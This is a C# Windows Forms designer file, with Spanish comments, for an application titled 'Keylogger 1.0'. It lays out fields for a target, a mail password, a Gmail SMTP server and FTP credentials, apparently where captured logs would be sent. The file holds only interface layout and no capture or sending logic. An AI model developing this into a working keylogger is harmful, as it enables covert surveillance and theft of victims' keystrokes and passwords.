namespace Keylogger_1._0
{
    partial class frmPrincipal
    {
        /// <summary>
        /// Variable del diseñador requerida.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Limpiar los recursos que se estén utilizando.
        /// </summary>
        /// <param name="disposing">true si los recursos administrados se deben eliminar; false en caso contrario.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Código generado por el Diseñador de Windows Forms

        /// <summary>
        /// Método necesario para admitir el Diseñador. No se puede modificar
        /// el contenido del método con el editor de código.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frmPrincipal));
            this.tabControl1 = new System.Windows.Forms.TabControl();
            this.tpInicio = new System.Windows.Forms.TabPage();
            this.tpMail = new System.Windows.Forms.TabPage();
            this.lblTarget = new System.Windows.Forms.Label();
            this.txtTarget = new System.Windows.Forms.TextBox();
            this.btnGuardarCorreo = new System.Windows.Forms.Button();
            this.lblMail = new System.Windows.Forms.Label();
            this.lblPass = new System.Windows.Forms.Label();
            this.txtPass = new System.Windows.Forms.TextBox();
            this.txtMail = new System.Windows.Forms.TextBox();
            this.tbGmail = new System.Windows.Forms.TabPage();
            this.label2 = new System.Windows.Forms.Label();
            this.txtPuerto = new System.Windows.Forms.TextBox();
            this.txtServidorGmail = new System.Windows.Forms.TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.btnGuardarServidorGmail = new System.Windows.Forms.Button();
            this.tbFtp = new System.Windows.Forms.TabPage();
            this.txtPassFTP = new System.Windows.Forms.TextBox();
            this.txtUsuarioFTP = new System.Windows.Forms.TextBox();
            this.label5 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.txtServidorFTP = new System.Windows.Forms.TextBox();
            this.btnGuardarFTP = new System.Windows.Forms.Button();
            this.label3 = new System.Windows.Forms.Label();
            this.tbProcesos = new System.Windows.Forms.TabPage();
            this.txtInformacion = new System.Windows.Forms.TextBox();
            this.statusBar = new System.Windows.Forms.StatusStrip();
            this.lblInformacion = new System.Windows.Forms.ToolStripStatusLabel();
            this.lblDate = new System.Windows.Forms.ToolStripStatusLabel();
            this.tabControl1.SuspendLayout();
            this.tpMail.SuspendLayout();
            this.tbGmail.SuspendLayout();
            this.tbFtp.SuspendLayout();
            this.tbProcesos.SuspendLayout();
            this.statusBar.SuspendLayout();
            this.SuspendLayout();
            // 
            // tabControl1
            // 
            this.tabControl1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.tabControl1.Controls.Add(this.tpInicio);
            this.tabControl1.Controls.Add(this.tpMail);
            this.tabControl1.Controls.Add(this.tbGmail);
            this.tabControl1.Controls.Add(this.tbFtp);
            this.tabControl1.Controls.Add(this.tbProcesos);
            this.tabControl1.Location = new System.Drawing.Point(0, 4);
            this.tabControl1.Name = "tabControl1";
            this.tabControl1.SelectedIndex = 0;
            this.tabControl1.Size = new System.Drawing.Size(648, 401);
            this.tabControl1.TabIndex = 0;
            // 
            // tpInicio
            // 
            this.tpInicio.BackColor = System.Drawing.SystemColors.Control;
            this.tpInicio.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.tpInicio.Location = new System.Drawing.Point(4, 22);
            this.tpInicio.Name = "tpInicio";
            this.tpInicio.Padding = new System.Windows.Forms.Padding(3);
            this.tpInicio.Size = new System.Drawing.Size(600, 367);
            this.tpInicio.TabIndex = 1;
            this.tpInicio.Text = "Inicio";
            this.tpInicio.ToolTipText = "Inicio";
            // 
            // tpMail
            // 
            this.tpMail.BackColor = System.Drawing.SystemColors.Control;
            this.tpMail.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.tpMail.Controls.Add(this.lblTarget);
            this.tpMail.Controls.Add(this.txtTarget);
            this.tpMail.Controls.Add(this.btnGuardarCorreo);
            this.tpMail.Controls.Add(this.lblMail);
            this.tpMail.Controls.Add(this.lblPass);
            this.tpMail.Controls.Add(this.txtPass);
            this.tpMail.Controls.Add(this.txtMail);
            this.tpMail.Location = new System.Drawing.Point(4, 22);
            this.tpMail.Name = "tpMail";
            this.tpMail.Padding = new System.Windows.Forms.Padding(3);
            this.tpMail.Size = new System.Drawing.Size(600, 367);
            this.tpMail.TabIndex = 0;
            this.tpMail.Text = "Correo";
            this.tpMail.ToolTipText = "Datos del Mail";
            // 
            // lblTarget
            // 
            this.lblTarget.AutoSize = true;
            this.lblTarget.Location = new System.Drawing.Point(4, 102);
            this.lblTarget.Name = "lblTarget";
            this.lblTarget.Size = new System.Drawing.Size(38, 13);
            this.lblTarget.TabIndex = 6;
            this.lblTarget.Text = "Target";
            // 
            // txtTarget
            // 
            this.txtTarget.Location = new System.Drawing.Point(48, 102);
            this.txtTarget.Name = "txtTarget";
            this.txtTarget.Size = new System.Drawing.Size(220, 20);
            this.txtTarget.TabIndex = 5;
            // 
            // btnGuardarCorreo
            // 
            this.btnGuardarCorreo.Location = new System.Drawing.Point(48, 138);
            this.btnGuardarCorreo.Name = "btnGuardarCorreo";
            this.btnGuardarCorreo.Size = new System.Drawing.Size(111, 23);
            this.btnGuardarCorreo.TabIndex = 4;
            this.btnGuardarCorreo.Text = "Guardar";
            this.btnGuardarCorreo.UseVisualStyleBackColor = true;
            this.btnGuardarCorreo.Click += new System.EventHandler(this.btnGuardarCorreo_Click);
            // 
            // lblMail
            // 
            this.lblMail.AutoSize = true;
            this.lblMail.Location = new System.Drawing.Point(16, 50);
            this.lblMail.Name = "lblMail";
            this.lblMail.Size = new System.Drawing.Size(26, 13);
            this.lblMail.TabIndex = 3;
            this.lblMail.Text = "Mail";
            // 
            // lblPass
            // 
            this.lblPass.AutoSize = true;
            this.lblPass.Location = new System.Drawing.Point(12, 76);
            this.lblPass.Name = "lblPass";
            this.lblPass.Size = new System.Drawing.Size(30, 13);
            this.lblPass.TabIndex = 2;
            this.lblPass.Text = "Pass";
            // 
            // txtPass
            // 
            this.txtPass.Location = new System.Drawing.Point(48, 76);
            this.txtPass.Name = "txtPass";
            this.txtPass.PasswordChar = '*';
            this.txtPass.Size = new System.Drawing.Size(144, 20);
            this.txtPass.TabIndex = 1;
            // 
            // txtMail
            // 
            this.txtMail.Location = new System.Drawing.Point(48, 50);
            this.txtMail.Name = "txtMail";
            this.txtMail.Size = new System.Drawing.Size(220, 20);
            this.txtMail.TabIndex = 0;
            // 
            // tbGmail
            // 
            this.tbGmail.BackColor = System.Drawing.SystemColors.Control;
            this.tbGmail.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.tbGmail.Controls.Add(this.label2);
            this.tbGmail.Controls.Add(this.txtPuerto);
            this.tbGmail.Controls.Add(this.txtServidorGmail);
            this.tbGmail.Controls.Add(this.label1);
            this.tbGmail.Controls.Add(this.btnGuardarServidorGmail);
            this.tbGmail.Location = new System.Drawing.Point(4, 22);
            this.tbGmail.Name = "tbGmail";
            this.tbGmail.Size = new System.Drawing.Size(600, 367);
            this.tbGmail.TabIndex = 3;
            this.tbGmail.Text = "Servidor Gmail";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(91, 75);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(38, 13);
            this.label2.TabIndex = 4;
            this.label2.Text = "Puerto";
            // 
            // txtPuerto
            // 
            this.txtPuerto.Location = new System.Drawing.Point(133, 75);
            this.txtPuerto.Name = "txtPuerto";
            this.txtPuerto.Size = new System.Drawing.Size(51, 20);
            this.txtPuerto.TabIndex = 3;
            // 
            // txtServidorGmail
            // 
            this.txtServidorGmail.Location = new System.Drawing.Point(133, 49);
            this.txtServidorGmail.Name = "txtServidorGmail";
            this.txtServidorGmail.Size = new System.Drawing.Size(220, 20);
            this.txtServidorGmail.TabIndex = 2;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(9, 49);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(120, 13);
            this.label1.TabIndex = 1;
            this.label1.Text = "Servidor de salida Gmail";
            // 
            // btnGuardarServidorGmail
            // 
            this.btnGuardarServidorGmail.Location = new System.Drawing.Point(133, 110);
            this.btnGuardarServidorGmail.Name = "btnGuardarServidorGmail";
            this.btnGuardarServidorGmail.Size = new System.Drawing.Size(113, 23);
            this.btnGuardarServidorGmail.TabIndex = 0;
            this.btnGuardarServidorGmail.Text = "Guardar";
            this.btnGuardarServidorGmail.UseVisualStyleBackColor = true;
            this.btnGuardarServidorGmail.Click += new System.EventHandler(this.btnGuardarServidorGmail_Click);
            // 
            // tbFtp
            // 
            this.tbFtp.BackColor = System.Drawing.SystemColors.Control;
            this.tbFtp.Controls.Add(this.txtPassFTP);
            this.tbFtp.Controls.Add(this.txtUsuarioFTP);
            this.tbFtp.Controls.Add(this.label5);
            this.tbFtp.Controls.Add(this.label4);
            this.tbFtp.Controls.Add(this.txtServidorFTP);
            this.tbFtp.Controls.Add(this.btnGuardarFTP);
            this.tbFtp.Controls.Add(this.label3);
            this.tbFtp.Location = new System.Drawing.Point(4, 22);
            this.tbFtp.Name = "tbFtp";
            this.tbFtp.Size = new System.Drawing.Size(600, 367);
            this.tbFtp.TabIndex = 4;
            this.tbFtp.Text = "FTP";
            // 
            // txtPassFTP
            // 
            this.txtPassFTP.Location = new System.Drawing.Point(102, 107);
            this.txtPassFTP.Name = "txtPassFTP";
            this.txtPassFTP.PasswordChar = '*';
            this.txtPassFTP.Size = new System.Drawing.Size(144, 20);
            this.txtPassFTP.TabIndex = 6;
            // 
            // txtUsuarioFTP
            // 
            this.txtUsuarioFTP.Location = new System.Drawing.Point(102, 81);
            this.txtUsuarioFTP.Name = "txtUsuarioFTP";
            this.txtUsuarioFTP.Size = new System.Drawing.Size(144, 20);
            this.txtUsuarioFTP.TabIndex = 5;
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(66, 107);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(30, 13);
            this.label5.TabIndex = 4;
            this.label5.Text = "Pass";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(53, 81);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(43, 13);
            this.label4.TabIndex = 3;
            this.label4.Text = "Usuario";
            // 
            // txtServidorFTP
            // 
            this.txtServidorFTP.Location = new System.Drawing.Point(102, 55);
            this.txtServidorFTP.Name = "txtServidorFTP";
            this.txtServidorFTP.Size = new System.Drawing.Size(220, 20);
            this.txtServidorFTP.TabIndex = 2;
            // 
            // btnGuardarFTP
            // 
            this.btnGuardarFTP.Location = new System.Drawing.Point(102, 145);
            this.btnGuardarFTP.Name = "btnGuardarFTP";
            this.btnGuardarFTP.Size = new System.Drawing.Size(113, 23);
            this.btnGuardarFTP.TabIndex = 1;
            this.btnGuardarFTP.Text = "Guardar";
            this.btnGuardarFTP.UseVisualStyleBackColor = true;
            this.btnGuardarFTP.Click += new System.EventHandler(this.btnGuardarFTP_Click);
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(27, 55);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(69, 13);
            this.label3.TabIndex = 0;
            this.label3.Text = "Servidor FTP";
            // 
            // tbProcesos
            // 
            this.tbProcesos.BackColor = System.Drawing.SystemColors.Control;
            this.tbProcesos.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.tbProcesos.Controls.Add(this.txtInformacion);
            this.tbProcesos.Location = new System.Drawing.Point(4, 22);
            this.tbProcesos.Name = "tbProcesos";
            this.tbProcesos.Size = new System.Drawing.Size(640, 375);
            this.tbProcesos.TabIndex = 2;
            this.tbProcesos.Text = "Proceso que realiza la Apps";
            this.tbProcesos.ToolTipText = "Descripción de procesos";
            // 
            // txtInformacion
            // 
            this.txtInformacion.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.txtInformacion.BackColor = System.Drawing.SystemColors.Window;
            this.txtInformacion.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtInformacion.Location = new System.Drawing.Point(7, 3);
            this.txtInformacion.Multiline = true;
            this.txtInformacion.Name = "txtInformacion";
            this.txtInformacion.ReadOnly = true;
            this.txtInformacion.Size = new System.Drawing.Size(626, 365);
            this.txtInformacion.TabIndex = 0;
            this.txtInformacion.Text = resources.GetString("txtInformacion.Text");
            // 
            // statusBar
            // 
            this.statusBar.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.lblInformacion,
            this.lblDate});
            this.statusBar.Location = new System.Drawing.Point(0, 408);
            this.statusBar.Name = "statusBar";
            this.statusBar.Size = new System.Drawing.Size(650, 22);
            this.statusBar.TabIndex = 1;
            this.statusBar.Text = "Barra de estado";
            // 
            // lblInformacion
            // 
            this.lblInformacion.Name = "lblInformacion";
            this.lblInformacion.Size = new System.Drawing.Size(0, 17);
            // 
            // lblDate
            // 
            this.lblDate.Name = "lblDate";
            this.lblDate.Size = new System.Drawing.Size(0, 17);
            // 
            // frmPrincipal
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(650, 430);
            this.Controls.Add(this.statusBar);
            this.Controls.Add(this.tabControl1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
            this.Name = "frmPrincipal";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Keylogger 1.0";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.frmPrincipal_FormClosing);
            this.Load += new System.EventHandler(this.frmPrincipal_Load);
            this.tabControl1.ResumeLayout(false);
            this.tpMail.ResumeLayout(false);
            this.tpMail.PerformLayout();
            this.tbGmail.ResumeLayout(false);
            this.tbGmail.PerformLayout();
            this.tbFtp.ResumeLayout(false);
            this.tbFtp.PerformLayout();
            this.tbProcesos.ResumeLayout(false);
            this.tbProcesos.PerformLayout();
            this.statusBar.ResumeLayout(false);
            this.statusBar.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion
                
        private System.Windows.Forms.TabControl tabControl1;
        private System.Windows.Forms.TabPage tpMail;
        private System.Windows.Forms.TabPage tpInicio;
        private System.Windows.Forms.StatusStrip statusBar;
        private System.Windows.Forms.TabPage tbProcesos;
        private System.Windows.Forms.ToolStripStatusLabel lblInformacion;
        private System.Windows.Forms.TextBox txtInformacion;
        private System.Windows.Forms.Button btnGuardarCorreo;
        private System.Windows.Forms.Label lblMail;
        private System.Windows.Forms.Label lblPass;
        private System.Windows.Forms.TextBox txtPass;
        private System.Windows.Forms.TextBox txtMail;
        private System.Windows.Forms.Label lblTarget;
        private System.Windows.Forms.TextBox txtTarget;
        private System.Windows.Forms.TabPage tbGmail;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.TextBox txtPuerto;
        private System.Windows.Forms.TextBox txtServidorGmail;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Button btnGuardarServidorGmail;
        private System.Windows.Forms.ToolStripStatusLabel lblDate;
        private System.Windows.Forms.TabPage tbFtp;
        private System.Windows.Forms.TextBox txtServidorFTP;
        private System.Windows.Forms.Button btnGuardarFTP;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.TextBox txtPassFTP;
        private System.Windows.Forms.TextBox txtUsuarioFTP;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.Label label4;
    }
}

